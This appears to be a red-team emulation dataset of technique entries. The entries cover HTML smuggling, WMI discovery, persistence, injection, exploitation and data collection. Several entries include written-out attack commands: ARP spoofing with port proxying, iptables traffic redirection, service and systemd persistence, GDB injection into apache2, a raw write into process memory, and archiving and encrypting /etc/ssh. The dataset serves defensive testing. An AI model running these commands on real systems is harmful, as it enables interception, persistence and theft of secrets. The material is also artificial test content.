attacks.description: Creates a simple HTML file that contains a hard‑coded Base64 string for a benign text payload. Opening the HTML in a browser triggers a download of hello.txt containing "Hello, world!".
attacks.expected_behavior: When the generated smuggle.html is opened in a web browser, JavaScript decodes the Base64 string and forces a download of a file named hello.txt with the content 'Hello, world!'.

attacks.technique_name: Obfuscated Files or Information: HTML Smuggling
attacks.description: Generates a Base64‑encoded shell script payload on‑the‑fly, embeds it in an HTML file, and uses JavaScript to decode and download the script as script.sh.
attacks.expected_behavior: Opening smuggle2.html in a browser causes the embedded Base64 script to be decoded and saved as script.sh, which contains a harmless bash script that writes a test file to /tmp.

attacks.technique_name: Obfuscated Files or Information: HTML Smuggling
attacks.description: Extracts the first 64 bytes of /etc/hosts, Base64‑encodes them, embeds the string in an HTML file, and uses JavaScript to reconstruct and download the data as hosts_copy.txt.
attacks.expected_behavior: When smuggle3.html is opened in a browser, the embedded Base64 data is decoded and saved as hosts_copy.txt, containing a partial copy of the system's hosts file.

attacks.description: Lists all active TCP/UDP connections and listening ports along with the owning process IDs.
attacks.expected_behavior: Displays a table of local and remote addresses, connection state, and PID for each socket.

attacks.description: Shows detailed IP configuration for every network adapter, including DNS servers and MAC addresses.
attacks.expected_behavior: Outputs adapter names, IPv4/IPv6 addresses, subnet masks, default gateways, DNS servers, and MAC addresses.

attacks.command: powershell -Command "Get-WmiObject -Class Win32_NetworkAdapterConfiguration -Filter \"IPEnabled = True\" | Select-Object Description, MACAddress, IPAddress, DefaultIPGateway"
attacks.description: Uses PowerShell and WMI to enumerate enabled network adapters and extracts their description, MAC, IP addresses, and default gateway.
attacks.expected_behavior: Prints a list of network adapters with fields: Description, MACAddress, IPAddress (array), and DefaultIPGateway (array).

attacks.description: Basic network discovery using netstat to list all listening TCP and UDP sockets with associated process IDs.
attacks.expected_behavior: Outputs a table of listening ports, protocols, local addresses, and the PID/program name of each listening service.

attacks.description: Intermediate discovery using ss to display detailed information about all TCP and UDP sockets, including process owners.
attacks.expected_behavior: Shows a list of sockets with protocol, state, local/remote addresses, and the PID/program name for each socket.

attacks.description: Advanced discovery using lsof to enumerate all open network connections and listening ports across the system.
attacks.expected_behavior: Prints a list of processes with open network files, including the command name, PID, user, protocol, and network endpoints.

attacks.description: Basic WMI query that retrieves the operating system name, version, and build number using the legacy wmic binary.
attacks.expected_behavior: Outputs key OS properties such as Caption, Version, and BuildNumber in a key=value format.

attacks.description: Intermediate PowerShell command that uses Get-WmiObject to enumerate installed Windows hotfixes (KB articles).
attacks.expected_behavior: Displays a table of HotFixID, Description, and InstalledOn dates for each installed update.

attacks.description: Advanced remote WMI query that connects to a specified host with supplied credentials and retrieves the name, PID, and command line of each running process.
attacks.expected_behavior: Returns a list of processes on the remote machine, including their executable name, process ID, and full command line arguments.

attacks.description: Basic WMI process enumeration attempt from Linux
attacks.expected_behavior: Attempts to list processes via WMI. Will fail on Linux hosts but generates WMI-related command-line activity.

attacks.description: Intermediate remote OS discovery via WMI
attacks.expected_behavior: Attempts to retrieve OS info from remote Windows host at 192.168.1.100 using WMI. Requires valid network access/credentials.

attacks.command: powershell -Command "$pass = ConvertTo-SecureString 'Test123!' -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential('user', $pass); Get-WmiObject -Class Win32_ComputerSystem -ComputerName 192.168.1.100 -Credential $cred -ErrorAction SilentlyContinue"
attacks.description: Advanced WMI query with explicit credentials
attacks.expected_behavior: Attempts authenticated WMI query against remote host using dummy credentials. Demonstrates credential passing for discovery.

attacks.description: Display the current ARP cache entries to verify network mapping; can be used by defenders to detect suspicious proxy activity.
attacks.expected_behavior: Outputs a list of IP addresses and their associated MAC addresses to the console.

attacks.description: Add a static ARP entry mapping the victim IP to the attacker’s MAC address, enabling ARP spoofing to act as a transparent proxy.
attacks.expected_behavior: Creates a persistent ARP entry; traffic destined for 192.168.1.10 will be sent to the attacker’s MAC.

attacks.command: arp -s 192.168.1.10 00-11-22-33-44-55 && netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8080 connectaddress=192.168.1.10 connectport=80
attacks.description: Combine static ARP entry with netsh portproxy to forward incoming connections on port 8080 to the victim’s web service, creating a proxy tunnel.
attacks.expected_behavior: Adds ARP entry then configures Windows portproxy; connections to local port 8080 are proxied to 192.168.1.10:80.

attacks.description: List all ARP cache entries to identify network devices
attacks.expected_behavior: Displays the ARP table showing IP/MAC address mappings for network reconnaissance

attacks.description: Add static ARP entry pointing to a potential proxy server's MAC address
attacks.expected_behavior: Creates a static ARP entry that could redirect traffic through a specified MAC address (simulating proxy redirection)

attacks.command: sudo sh -c "arp -n | grep -w '192.168.1.1' | awk '{print \$3}' | xargs -I {} iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:8080"
attacks.description: Identify gateway via ARP and redirect HTTP traffic to proxy port using iptables
attacks.expected_behavior: Extracts gateway MAC address and configures iptables to redirect HTTP traffic to port 8080 on the same IP (simulating proxy tunneling)

attacks.command: sc create TestService binPath= \"cmd.exe /c echo Hello > %TEMP%\\test.txt\" start= auto
attacks.description: Creates a new Windows service named 'TestService' that runs a harmless command to write 'Hello' to a file in the TEMP directory. Demonstrates creating a system process for persistence.
attacks.expected_behavior: A new service appears in the Services console and starts automatically, executing the cmd.exe process which creates %TEMP%\test.txt containing the word 'Hello'.

attacks.command: reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\TestService\" /v ImagePath /t REG_EXPAND_SZ /d \"cmd.exe /c echo ServiceModified > %TEMP%\\svc.txt\" /f
attacks.description: Modifies the ImagePath value of the previously created 'TestService' to point to a new benign command that writes to a different file. Shows modifying an existing system process definition.
attacks.expected_behavior: The ImagePath registry entry for TestService is updated. When the service starts (or is restarted), it now creates %TEMP%\svc.txt containing 'ServiceModified'.

attacks.description: Creates a scheduled task that runs at user logon with highest privileges, executing a harmless command that writes to a file. Represents an advanced persistence method via system task scheduler.
attacks.expected_behavior: A new task named 'PersistTask' appears in Task Scheduler. At each logon, it runs cmd.exe, creating %TEMP%\sched.txt containing the word 'Scheduled'.

attacks.description: Add user cron job to execute script on reboot
attacks.expected_behavior: Adds a cron job for the current user that executes /tmp/test-script.sh at system boot

attacks.command:
echo -e '[Unit]
Description=Test Service

[Service]
ExecStart=/bin/bash /tmp/test-script.sh

[Install]
WantedBy=multi-user.target' | sudo tee /etc/systemd/system/testservice.service && sudo systemctl enable testservice.service
attacks.description: Create and enable systemd service for persistence
attacks.expected_behavior: Creates a systemd service that runs /tmp/test-script.sh at boot and enables it

attacks.description: Add login hook script to /etc/profile.d
attacks.expected_behavior: Creates a script in /etc/profile.d that executes /tmp/test-script.sh on user login

attacks.description: Basic GDB injection to load libc.so into a bash process
attacks.expected_behavior: Target process (bash) loads libc.so.6 into its memory space, visible via /proc/[PID]/maps

attacks.command: sudo bash -c 'PID=$(pidof -s apache2); gdb -p $PID -ex "call (void)dlopen(\"/lib/x86_64-linux-gnu/libc.so.6\", 1)" -ex detach -ex quit'
attacks.description: Intermediate scripted injection targeting Apache2 process
attacks.expected_behavior: Apache2 process loads libc.so.6 via automated GDB injection

attacks.command: sudo bash -c 'ADDR=$(grep -m1 rw-p /proc/$(pidof bash)/maps | cut -d" " -f1); START=${ADDR%-*}; OFFSET=$(printf "%d" 0x$START); echo -ne "\x90\x90\x90\x90" | dd of=/proc/$(pidof bash)/mem seek=$OFFSET bs=1 conv=notrunc'
attacks.description: Advanced memory overwrite via /proc filesystem
attacks.expected_behavior: Writes 4 NOP instructions to bash process memory at first writable region

attacks.description: Double base64 encoding/decoding to execute benign payload
attacks.expected_behavior: Creates /tmp/testfile with 'Test payload' text after decoding

attacks.description: AES-encrypted script decrypted and executed
attacks.expected_behavior: Decrypts pre-encrypted test script that writes to /tmp/test_encrypted_file

attacks.description: Base64+gzip multi-layer obfuscated script execution
attacks.expected_behavior: Decompresses gzipped base64 payload creating /tmp/multi_test_file

attacks.description: Basic exploitation: sends a GET request to a vulnerable public‑facing web endpoint that executes the 'calc' command via a query parameter.
attacks.expected_behavior: The request is sent; if the server is vulnerable, it would launch calc.exe on the target system. In a test environment, no action occurs beyond the HTTP request.

attacks.description: Intermediate exploitation: performs a POST request with a malicious command in the request body, mimicking a form‑based injection against a public‑facing application.
attacks.expected_behavior: The POST request is transmitted; a vulnerable server might execute the supplied command. The command itself only generates network traffic.

attacks.description: Advanced exploitation: after compromising a public‑facing service, uses bitsadmin to download a secondary payload to the temp directory and executes it.
attacks.expected_behavior: Bitsadmin initiates a background download of the dummy payload; upon completion, the payload is launched via start. In a safe test, the URL points to a harmless file.

attacks.description: Basic SQL injection attempt against web login endpoint
attacks.expected_behavior: Sends SQL injection payload to login form attempting unauthorized access

attacks.description: Intermediate command injection via CGI parameter
attacks.expected_behavior: Exploits command injection vulnerability to execute echo command through CGI script

attacks.description: Advanced Apache Struts2 OGNL injection exploit
attacks.expected_behavior: Exploits OGNL injection vulnerability to execute benign shell command through crafted header

attacks.description: Compress a single test file into a ZIP archive using PowerShell's built‑in Compress-Archive cmdlet.
attacks.expected_behavior: Creates data.zip in the TEMP directory containing data.txt; no files are modified or deleted.

attacks.description: Archive two log files into a cabinet (.cab) archive using the built‑in makecab utility.
attacks.expected_behavior: Creates logs.cab in the TEMP directory containing log1.txt and log2.txt; original files remain unchanged.

attacks.description: Recursively archive all files in a user‑writable collection folder, then delete the original folder to simulate data exfiltration preparation.
attacks.expected_behavior: Creates CollectedData.zip in the TEMP directory containing all files from %APPDATA%\CollectedData, then removes the source folder; deletion errors are suppressed.

attacks.description: Basic archive of user documents directory
attacks.expected_behavior: Creates compressed archive of Documents folder in user's home directory

attacks.description: Intermediate: Archive system config files
attacks.expected_behavior: Archives all .conf files from /etc into /tmp/configs.tar.gz using sudo privileges

attacks.command: sudo tar -czf /tmp/data.tar.gz /var/log /etc/ssh && openssl enc -aes-256-cbc -salt -in /tmp/data.tar.gz -out /tmp/data.enc -k pass123 && sudo rm /tmp/data.tar.gz
attacks.description: Advanced: Archive logs/SSH configs, encrypt, and clean up
attacks.expected_behavior: Creates encrypted archive of sensitive directories then deletes original temp archive

attacks.description: Basic screen capture: captures the primary monitor and saves a PNG file to the %TEMP% directory.
attacks.expected_behavior: A file named screenshot_basic.png appears in the user's temporary folder containing a screenshot of the primary display.

attacks.description: Intermediate capture with archiving: takes a screenshot, stores it temporarily, compresses it into a ZIP file, and cleans up the original PNG.
attacks.expected_behavior: A ZIP archive named screenshots.zip is created in %TEMP% containing the captured PNG; the original PNG file is removed.

attacks.description: Advanced capture with post‑processing: captures a screenshot, encodes it to Base64, writes the encoded string to a .b64 file, and deletes the original image.
attacks.expected_behavior: A file named screenshot_advanced.b64 appears in %TEMP% containing the Base64 representation of the screenshot; the PNG file is removed.

attacks.description: Basic X11 screen capture using ImageMagick
attacks.expected_behavior: Creates PNG screenshot of entire X11 display in /tmp directory

attacks.description: Intermediate timed screen capture with scrot
attacks.expected_behavior: Captures screen after 5-second delay and saves to /tmp

attacks.description: Advanced screen recording via ffmpeg/X11
attacks.expected_behavior: Records 10 seconds of X11 display activity as MP4 video
